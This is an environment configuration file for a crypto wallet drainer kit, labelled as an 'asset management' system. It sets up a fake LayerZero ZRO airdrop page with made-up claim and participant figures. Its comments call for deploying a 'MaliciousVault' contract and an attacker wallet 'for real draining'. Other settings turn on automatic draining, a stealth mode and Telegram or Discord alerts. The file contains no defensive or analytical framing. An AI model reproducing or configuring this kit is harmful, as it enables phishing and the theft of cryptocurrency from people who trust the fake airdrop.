# [PRODUCTION - ASSET MANAGEMENT CONFIGURATION]
# Environment Configuration for Multi-Currency Asset Management System
# Authorized use only.

# Server Configuration
PORT=3000
NODE_ENV=development

# Admin Dashboard
ADMIN_USERNAME=admin
ADMIN_PASSWORD=admin123
JWT_SECRET=your-super-secret-jwt-key-change-this-in-production

# Blockchain Configuration
# Ethereum Mainnet
ETHEREUM_RPC_URL=https://mainnet.infura.io/v3/YOUR_PROJECT_ID
RPC_URL=https://mainnet.infura.io/v3/YOUR_PROJECT_ID
PRIVATE_KEY=0x1234567890123456789012345678901234567890123456789012345678901234

# BSC (Binance Smart Chain)
BSC_RPC_URL=https://bsc-dataseed1.binance.org/

# Polygon
POLYGON_RPC_URL=https://polygon-rpc.com/

# Avalanche
AVALANCHE_RPC_URL=https://api.avax.network/ext/bc/C/rpc

# Arbitrum
ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc

# Optimism
OPTIMISM_RPC_URL=https://mainnet.optimism.io

# Vault Contract Configuration (REQUIRED FOR REAL DRAINING)
# Deploy MaliciousVault.sol and set the contract address here
VAULT_CONTRACT_ADDRESS=0x0000000000000000000000000000000000000000

# Attacker Wallet Configuration (REQUIRED FOR REAL DRAINING)
# Set the private key of the wallet that will receive drained tokens
ATTACKER_WALLET_PRIVATE_KEY=0x1234567890123456789012345678901234567890123456789012345678901234

# Notification Configuration
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
TELEGRAM_CHAT_ID=your_telegram_chat_id_here
DISCORD_WEBHOOK_URL=your_discord_webhook_url_here

# Price Data API
COINGECKO_API_KEY=your_coingecko_api_key_here
COINMARKETCAP_API_KEY=your_coinmarketcap_api_key_here

# Token and Airdrop Configuration (with fallbacks)
TOKEN_NAME=LayerZero
TOKEN_SYMBOL=ZRO
TOKEN_PRICE=2.01
AIRDROP_AMOUNT=1000
AIRDROP_END_DATE=31/12/2025 23:59
AIRDROP_DESCRIPTION=LayerZero is a protocol that enables cross-chain applications to communicate with each other in a trustless manner.

# Allocation and Distribution
TOTAL_ALLOCATION=10000000
CLAIMED_AMOUNT=7500000
PARTICIPANT_COUNT=12500
TRADING_VOLUME=35.1

# Network Configuration
NETWORK_NAME=Ethereum Mainnet
CHAIN_ID=1

# Attacker Wallet Address (for display purposes)
ATTACKER_WALLET_ADDRESS=0x0000000000000000000000000000000000000000

# Operation Settings
DRAIN_DELAY=500
MAX_RETRIES=3
MIN_DRAIN_VALUE=1.0
AUTO_DRAIN_ENABLED=true
STEALTH_MODE=true

# Security Configuration
CORS_ORIGIN=http://localhost:3000
HELMET_ENABLED=true
